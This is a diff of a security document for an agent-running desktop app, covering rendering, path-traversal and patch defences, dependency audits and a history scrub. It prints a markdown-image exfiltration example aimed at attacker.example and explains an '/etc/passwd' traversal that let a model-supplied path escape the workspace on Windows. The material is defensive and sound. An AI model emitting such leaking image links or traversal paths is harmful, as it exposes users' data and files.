@@ -28,13 +28,13 @@ tries to make what they did legible and reversible.
 |---|---|---|
 | Rendered markdown | Embedded HTML renders as text; `rehype-raw` is deliberately absent | `Markdown.tsx` |
 | Links in output | `javascript:` and `data:` URLs are stripped | react-markdown default |
-| Images in output | Described, never fetched — see below | `Markdown.tsx` |
+| Images in output | Described, never fetched: see below | `Markdown.tsx` |
 | Webview | CSP: `default-src 'self'`, no object, no framing, connect limited to Tauri IPC | `tauri.conf.json` |
 | Subprocesses | Always an argv array; no shell string is ever built | `proc.rs`, `pty.rs`, `adapters.rs` |
-| Model-supplied paths | Absolute paths and `..` refused before any filesystem access, by **both** platforms' rules on every platform — see below | `paths.rs` |
+| Model-supplied paths | Absolute paths and `..` refused before any filesystem access, by **both** platforms' rules on every platform: see below | `paths.rs` |
 | Patches | Header paths rebuilt from a vetted relative path; `git apply --check` first | `git.rs` |
 | Quiver's files | Read-only, always | `quiver.rs` |
-| Network | The host makes no outbound requests. Artemis does not phone home | — |
+| Network | The host makes no outbound requests. Artemis does not phone home | n/a |
 
 Each has a test. The path and patch rules are exercised against real git
 repositories, because they are the ones that can destroy work.
@@ -42,7 +42,7 @@ repositories, because they are the ones that can destroy work.
 ### Why images are not loaded
 
 `![](https://attacker.example/p.png?leak=…)` in an answer would fetch the moment
-the transcript painted — no click, no warning — and anything the model had just
+the transcript painted (no click, no warning) and anything the model had just
 read could ride out in that query string. An image reference is shown with its
 alt text and URL, and nothing is requested. Reference-style syntax is covered
 too; it is the form that slips past a naive fix.
@@ -54,7 +54,7 @@ platform is blind to an escape the other one sees.
 
 **`/etc/passwd` is not an absolute path on Windows.** It has no drive letter, so
 `is_absolute()` returns false and it passed the check. Worse, `join` on Windows
-does not append a rooted path — it *replaces* the root, so `C:\workspace` joined
+does not append a rooted path: it *replaces* the root, so `C:\workspace` joined
 with `/etc/passwd` is `C:\etc\passwd`. An agent could name any rooted path on the
 workspace's drive and be read a file outside it.
 
@@ -69,15 +69,15 @@ not a separator.
 So the check applies both sets of rules everywhere: rooted paths in either
 notation, drive-qualified paths, UNC prefixes, and `..` after separators are
 normalised. A Unix filename may legitimately contain a backslash and is refused
-by this — a deliberate trade, since refusing an unusual name costs a reader one
+by this: a deliberate trade, since refusing an unusual name costs a reader one
 click and accepting a traversal costs the file.
 
 ## Known accepted findings
 
 **`cargo audit`: 0 vulnerabilities** across 449 crates. 17 warnings, all
-transitive through Tauri and all accepted: 16 unmaintained (`atk`, `gdk`, `gtk`
-and friends — the GTK3 bindings Tauri uses for the Linux webview — plus the
-`unic-*` family) and 1 unsound (`glib` `VariantStrIter`). None is reachable from
+transitive through Tauri and all accepted. 16 are unmaintained: `atk`, `gdk`,
+`gtk` and friends, which are the GTK3 bindings Tauri uses for the Linux webview,
+plus the `unic-*` family. 1 is unsound (`glib` `VariantStrIter`). None is reachable from
 Artemis's own code; they resolve when Tauri moves to GTK4.
 
 **`pnpm audit`: 9 advisories, all dev-only.** Every one is in the
@@ -92,7 +92,7 @@ over from the Quiver fixture. All 36 commits were rewritten on that date with
 `scripts/scrub-history.sh`, and the remote this repository is published from was
 created fresh from the rewritten history.
 
-Nothing in history was ever a credential — every blob in every commit was
+Nothing in history was ever a credential: every blob in every commit was
 scanned for private keys and provider tokens, and there were none. What was
 there was personal data, and a git history is permanent once published.
 
@@ -119,7 +119,7 @@ Three things the first version of this got wrong, all found by testing it:
   command would have restored the *scrubbed* history. Only the current branch is
   rewritten now.
 - **A committed `.pyc` carried everything.** Compiled Python embeds the string
-  constants of the module it was built from — at the time, the whole token list.
+  constants of the module it was built from: at the time, the whole token list.
   Being binary, it was skipped by the scrubber *and* by the verification pass:
   the scrub would have reported a clean history and left the data in a blob. The
   verification now reads binary blobs, the filter deletes bytecode outright, and
@@ -131,13 +131,13 @@ Three things the first version of this got wrong, all found by testing it:
 
 **A force-push would not have been enough.** Rewriting history locally makes the
 old commits unreachable; it does not remove them from GitHub, where they stay
-fetchable by SHA until the server garbage-collects — which can take a long time
+fetchable by SHA until the server garbage-collects, which can take a long time
 and is not something you can trigger or observe. Anyone who had ever seen an old
 SHA could still fetch the personal data from a repository that looked clean.
 
 So the remote was rebuilt instead: a new repository, the rewritten history
 pushed to it, and the original deleted. Verified afterwards by asking GitHub for
-three pre-rewrite SHAs by name — all now 404. That was cheap here, with 36
+three pre-rewrite SHAs by name: all now 404. That was cheap here, with 36
 commits, no forks, no pull requests and no other collaborators; on a repository
 with history worth keeping, the alternative is to force-push and then ask GitHub
 support to garbage-collect, confirming an old SHA no longer resolves before
